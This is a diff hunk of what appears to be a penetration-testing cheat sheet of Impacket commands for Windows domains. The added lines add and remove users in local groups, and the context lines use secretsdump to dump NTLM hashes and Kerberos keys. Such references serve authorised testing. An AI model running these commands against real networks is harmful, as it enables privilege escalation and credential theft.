@@ -327,7 +327,11 @@ impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' computer -remove 'COMPUTERNAME'
 impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' computer -enable 'COMPUTERNAME'
 impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' computer -disable 'COMPUTERNAME'
 impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' localgroup
+impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' localgroup -name 'GROUPNAME'
+impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' localgroup -name 'GROUPNAME' -join 'USERNAME'
+impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' localgroup -name 'GROUPNAME' -unjoin 'USERNAME'
 impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' group
+impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' group 
 # dumping NTLM hashs and Kerberos Keys
 impacket-secretsdump -ts 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-secretsdump -ts -just-dc-user 'USERNAME' -just-dc-ntlm 'DOMAIN/USERNAME:PASSWORD@IP'
